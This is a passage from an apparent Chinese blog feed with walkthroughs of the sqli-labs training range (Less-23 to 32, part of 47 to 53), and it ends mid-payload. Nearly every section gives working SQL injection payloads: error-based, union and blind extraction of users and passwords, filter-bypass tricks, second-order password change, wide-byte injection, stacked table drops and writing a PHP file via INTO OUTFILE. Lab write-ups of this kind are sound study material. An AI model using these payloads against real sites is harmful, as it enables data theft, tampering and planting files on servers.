class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时查询结果已经导入到test.txt文件当中了:</p><p> <img src="/posts/7e37/47_2.png" class></p><h3 id="（4）利用-lines-terminated-by上传木马-1"><a href="#（4）利用-lines-terminated-by上传木马-1" class="headerlink" title="（4）利用 lines terminated by上传木马"></a>（4）利用 lines terminated by上传木马</h3><pre class="line-numbers language-bash"><code class="language-bash">将<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>转换为十六进制：3c3f70687020706870696e666f28293b3f3epayload:sort<span class="token operator">=</span>1'into outfile <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-47\\test.php"</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，可以成功访问text.php：</p><p> <img src="/posts/7e37/47_3.png" class></p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>本关与Less-46的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关与Less-47关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进行注入。</p><h1 id="order-by的堆叠注入-Less-50-Less53"><a href="#order-by的堆叠注入-Less-50-Less53" class="headerlink" title="order by的堆叠注入(Less-50~Less53)"></a>order by的堆叠注入(Less-50~Less53)</h1><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>前面关卡用的方法都可行。</p><p>这里就只主要看堆叠的增删操作吧。</p><h3 id="50-1添加一个表格"><a href="#50-1添加一个表格" class="headerlink" title="50.1添加一个表格"></a>50.1添加一个表格</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1<span class="token punctuation">;</span>create table Less50 like <span class="token function">users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less50:</p><p> <img src="/posts/7e37/50.png" class></p><h3 id="50-2删除一个表格"><a href="#50-2删除一个表格" class="headerlink" title="50.2删除一个表格"></a>50.2删除一个表格</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sort<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table Less50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功删除了表格Less50:</p><p> <img src="/posts/7e37/50_2.png" class></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>跟Less-50差不多。只是多了个单引号，后面记得加注释符。</p><h4 id="添加一个表格："><a href="#添加一个表格：" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table Less51 like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less51:</p><p> <img src="/posts/7e37/51.png" class></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>和 less50 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于堆叠注入是一样的利用方式。</p><h4 id="添加一个表格：-1"><a href="#添加一个表格：-1" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1<span class="token punctuation">;</span>create table Less52 like <span class="token function">users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less52:</p><p> <img src="/posts/7e37/52.png" class></p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>和 less51 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于堆叠注入是一样的利用方式。</p><h4 id="添加一个表格：-2"><a href="#添加一个表格：-2" class="headerlink" title="添加一个表格："></a>添加一个表格：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：sort<span class="token operator">=</span>1'<span class="token punctuation">;</span>create table Less53 like users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到已经成功添加了表格Less53:</p><img src="/posts/7e37/53.png" class>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli靶场(23~37关)</title>
      <link href="/posts/fb8a.html"/>
      <url>/posts/fb8a.html</url>
      
        <content type="html"><![CDATA[<p>第二部分来啦~~</p><span id="more"></span><h1 id="Less-23-注释符绕过"><a href="#Less-23-注释符绕过" class="headerlink" title="Less-23 注释符绕过"></a>Less-23 注释符绕过</h1><p>输入1’出现如下报错信息:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span> LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可猜测源码中可能为’$id’</p><p>当构造id=1’ and ‘1’=’1 时正常,而id=1’ and ‘1’=’1’#或者id=1’ and ‘1’=’1’–+ 时报错，发现是对#和–+等注释符进行了过滤。</p><p>注释符绕过只能构造一个单引号来闭合后面的但引号。</p><h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h3 id="23-1获取数据库用户名"><a href="#23-1获取数据库用户名" class="headerlink" title="23.1获取数据库用户名"></a>23.1获取数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/23.png" class></p><h3 id="23-2获取数据库名"><a href="#23-2获取数据库名" class="headerlink" title="23.2获取数据库名"></a>23.2获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/23_2.png" class></p><p>或者使用：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and info() and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/23_3.png" class></p><h3 id="23-3获取表名"><a href="#23-3获取表名" class="headerlink" title="23.3获取表名"></a>23.3获取表名</h3><p>其实我报错函数我比较喜欢用updatexml()，但是呢，当它只能显示32长度的内容，绕过获取的内容超过32字符就要采用字符串截取的方式。然后每次获取32字符串的内容。</p><p>比如：</p><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,31) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/23_4.png" class></p><p>然后接着获取：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),32,62) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/fb8a/23_5.png" class><p>啊还有一小节，再来一个：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),63,93) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/23_6.png" class></p><p>好了，完工。</p><p>其实吧，该说不说，上面这种可能直接手工注入的时候会容易记忆一点，但如果要写成测试脚本的话，就还是使用floor()函数，比较好：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and (select count(*) from information_schema.tables group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好的，亏我以为floor()函数能一次性查出来所有的，原来也只能查到64字节，那剩下的字节就还是用substr()函数查出来吧。</p><p> <img src="/posts/fb8a/23_7.png" class></p><h1 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h1><p>本关为二次注入。</p><p>二次注入含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p><p>大致原理：先创建一个用户admin’#,再登录这个账号修改密码。原来的密码那里可以任意输，新密码自己设定。修改完成后会发现成功修改了已有账号admin的密码。</p><h3 id="24-1先创建一个admin’-的账号"><a href="#24-1先创建一个admin’-的账号" class="headerlink" title="24.1先创建一个admin’#的账号"></a>24.1先创建一个admin’#的账号</h3><p> <img src="/posts/fb8a/24.png" class></p><h3 id="24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"><a href="#24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。" class="headerlink" title="24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"></a>24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。</h3><p>在源代码中的sql语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='<span class="token variable">$pass</span>' where username='<span class="token variable">$username</span>' and password='<span class="token variable">$curr_pass</span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即如果我们修改admin’#的密码会变成：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> "UPDATE <span class="token function">users</span> SET PASSWORD<span class="token operator">=</span><span class="token string">'<span class="token variable">$pass</span>'</span> where username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment" spellcheck="true">#' and password='$curr_pass' ";</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们就可以变成修改admin的密码了。</p><p> <img src="/posts/fb8a/24_2.png" class></p><h3 id="24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"><a href="#24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456" class="headerlink" title="24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"></a>24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456</h3><p> <img src="/posts/fb8a/23_3.png" class></p><h1 id="and和or绕过-Less-25-Less25a"><a href="#and和or绕过-Less-25-Less25a" class="headerlink" title="and和or绕过(Less-25~Less25a)"></a>and和or绕过(Less-25~Less25a)</h1><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>本关对or和and进行了过滤。要绕过or和and，构造其他的注入语句。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>尝试双写绕过。即双写关键字，可将and写为anandd，or写成oorr,发现成功绕过了耶。</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>可尝试将and替换成&amp;&amp;，or替换成||。这里我试了一下用||可以，但&amp;&amp;不可以，因为&amp;在数据包里面相当于里面的参数连接符，可以将&amp;&amp;进行url编码成%26%26使用。</p><h3 id="这里采用双写绕过并利用报错注入："><a href="#这里采用双写绕过并利用报错注入：" class="headerlink" title="这里采用双写绕过并利用报错注入："></a>这里采用双写绕过并利用报错注入：</h3><h4 id="①获取数据库用户名"><a href="#①获取数据库用户名" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/25.png" class><h4 id="②获取数据库名"><a href="#②获取数据库名" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' anandd info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/25_2.png" class></p><p>或者使用：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/25_3.png" class></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>本关错误时不会显示错在哪里了，所以不能采用报错注入。并且也对and和or进行了过滤。</p><p>当使用id=1 || 1=1出现正确信息，说明在源码中id=$id。</p><p>可以使用延时注入和布尔盲注。</p><h3 id="这里还是用anandd双写来代替and-下面采用基于布尔的盲注："><a href="#这里还是用anandd双写来代替and-下面采用基于布尔的盲注：" class="headerlink" title="这里还是用anandd双写来代替and,下面采用基于布尔的盲注："></a>这里还是用anandd双写来代替and,下面采用基于布尔的盲注：</h3><h4 id="①获取数据库用户名-1"><a href="#①获取数据库用户名-1" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p><h4 id="②获取数据库名-1"><a href="#②获取数据库名-1" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p><p> <img src="/posts/fb8a/25a.png" class></p><h1 id="空格字符绕过-Less-26-Less26a"><a href="#空格字符绕过-Less-26-Less26a" class="headerlink" title="空格字符绕过(Less-26~Less26a)"></a>空格字符绕过(Less-26~Less26a)</h1><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>本关将or,and,空格,/*,#,–,/等各种字符就进行了过滤。</p><p>空格字符绕过：</p><pre class="line-numbers language-bash"><code class="language-bash">%20 %09 %0a %0b %0c %0d %a0 /**/ +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="本关可以用报错注入："><a href="#本关可以用报错注入：" class="headerlink" title="本关可以用报错注入："></a>本关可以用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,user(),0x7e),1)+||+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26.png" class></p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'+||+info()+||+'</span>1或者id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,database(),0x7e),1)+||+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26_2.png" class></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关过滤的字符跟第二十六关一样，闭合方式是’) 并且不能用报错注入了，因为不会显示错在哪里了。可以采用union联合注入或盲注。</p><h3 id="下面采用union联合注入："><a href="#下面采用union联合注入：" class="headerlink" title="下面采用union联合注入："></a>下面采用union联合注入：</h3><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,database(),3+||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的999为一个不存在的值，%0b可以用%a0代替，其他不行，可能是系统问题。</p><p>  <img src="/posts/fb8a/26a.png" class></p><h4 id="②获得用户名"><a href="#②获得用户名" class="headerlink" title="②获得用户名"></a>②获得用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,user(),3+||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26a_2.png" class></p><h4 id="③获得表名"><a href="#③获得表名" class="headerlink" title="③获得表名"></a>③获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26a_3.png" class></p><h1 id="union和select绕过-Less-27-Less-28a"><a href="#union和select绕过-Less-27-Less-28a" class="headerlink" title="union和select绕过(Less-27~Less-28a)"></a>union和select绕过(Less-27~Less-28a)</h1><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>本关主要是union、select字符和26关过滤掉的字符。</p><p>如果要用到union和select的话，可以使用大小写混写或者双写关键字绕过。</p><h3 id="可以采用报错注入："><a href="#可以采用报错注入：" class="headerlink" title="可以采用报错注入："></a>可以采用报错注入：</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,user(),0x7e),1)+and+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/27.png" class></p><h4 id="②获得数据库名："><a href="#②获得数据库名：" class="headerlink" title="②获得数据库名："></a>②获得数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">'+and%a0info()+and+'</span>1或者id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,database(),0x7e),1)+and+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/27_2.png" class></p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关过滤的字符跟第二十七关一样，闭合方式为”并且不能采用报错注入了。</p><h3 id="可以采用union联合注入（union和select大小写混写）："><a href="#可以采用union联合注入（union和select大小写混写）：" class="headerlink" title="可以采用union联合注入（union和select大小写混写）："></a>可以采用union联合注入（union和select大小写混写）：</h3><h4 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,user(),3+||+"</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/27a.png" class></p><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,database(),3+||+"</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/27a_2.png" class><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>本关第二十七差不多,只是闭合的方式是’)</p><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,database(),3+||+('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/28.png" class></p><h4 id="②获得数据库用户名"><a href="#②获得数据库用户名" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,user(),3+||+('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/28_2.png" class></p><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>用第二十八关的payload一样可以</p><h1 id="HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31"><a href="#HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31" class="headerlink" title="HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)"></a>HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)</h1><p>这三关是要搭建环境才能实现的。好像要在Ubuntu下，并且要下载tomcat，jdk等等。想了想，了解下原理，还是在PHP环境下绕过得了。</p><p>这里的两层架构的工作流程为：</p><p>client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p><p>这里需要注意的就是：</p><p>index.php?id=1&amp;id=2,在Apache(php)解析最后一个参数，Tomcat(jsp)解析第一个参数。那先经过Tomcat再到Apache的也是显示最后一个参数。</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这里使用一个单引号报错，使用两个单引号正常。</p><h3 id="（1）直接用报错注入"><a href="#（1）直接用报错注入" class="headerlink" title="（1）直接用报错注入"></a>（1）直接用报错注入</h3><h4 id="①得到数据库用户名"><a href="#①得到数据库用户名" class="headerlink" title="①得到数据库用户名"></a>①得到数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29.png" class></p><h4 id="②获取数据库名-2"><a href="#②获取数据库名-2" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_2.png" class> </p><h3 id="（2）使用联合注入"><a href="#（2）使用联合注入" class="headerlink" title="（2）使用联合注入"></a>（2）使用联合注入</h3><p>其实吧，我一般不怎么用union，因为还要先判断字段和注入点。好久没用了，还是用一下吧。</p><h4 id="①先判断有几个字段"><a href="#①先判断有几个字段" class="headerlink" title="①先判断有几个字段"></a>①先判断有几个字段</h4><p>当输到id=1’ order by 4–+时报错，说明有三个字段</p><h4 id="②找注入点"><a href="#②找注入点" class="headerlink" title="②找注入点"></a>②找注入点</h4><p>id=-1’ union select  1,2,3–+</p><p>可以看到在2,3的位置都可以写注入语句。</p><p>  <img src="/posts/fb8a/29_3.png" class></p><h4 id="③构造union语句"><a href="#③构造union语句" class="headerlink" title="③构造union语句"></a>③构造union语句</h4><h3 id="29-1获得数据库用户名"><a href="#29-1获得数据库用户名" class="headerlink" title="29.1获得数据库用户名"></a>29.1获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,user<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_4.png" class></p><h3 id="29-2获得数据库名"><a href="#29-2获得数据库名" class="headerlink" title="29.2获得数据库名"></a>29.2获得数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_5.png" class></p><h3 id="29-3获得表名"><a href="#29-3获得表名" class="headerlink" title="29.3获得表名"></a>29.3获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_6.png" class></p><h3 id="29-4获得字段名"><a href="#29-4获得字段名" class="headerlink" title="29.4获得字段名"></a>29.4获得字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select  1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_7.png" class></p><h3 id="29-5获取用户名和密码"><a href="#29-5获取用户名和密码" class="headerlink" title="29.5获取用户名和密码"></a>29.5获取用户名和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/29_8.png" class><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>这一关不显示报错信息，不能用报错注入了，但还是可以用union联合注入的，payload跟第二十九的一样，只需要将第二十九关的union联合注入的’换成”即可</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>这关跟二十九关也一样，只需要将’换成”)即可，对于报错注入和union联合注入都能用。</p><h1 id="宽字节注入-Less-32-Less-37"><a href="#宽字节注入-Less-32-Less-37" class="headerlink" title="宽字节注入(Less-32~Less-37)"></a>宽字节注入(Less-32~Less-37)</h1><p>这几关是针对’和\的过滤。在这里，会将’转换为&#39;</p><p>宽字节注入产生的原因：数据库编码与PHP编码设置为不同的两个编码。</p><p>Big5和GBK字符集有可能会存在宽字节注入，utf-8和gb2312没有。Mysql在使用GBK编码时，会认为两个字符为一个汉字。</p><p>思路一：%df吃掉\ 原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p><p>思路二：将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>本关将’转换为&#39;，我们利用%df消掉生成的那个\。</p><h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><h4 id="①获得数据库名-1"><a href="#①获得数据库名-1" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1%df<span class="token string">' and 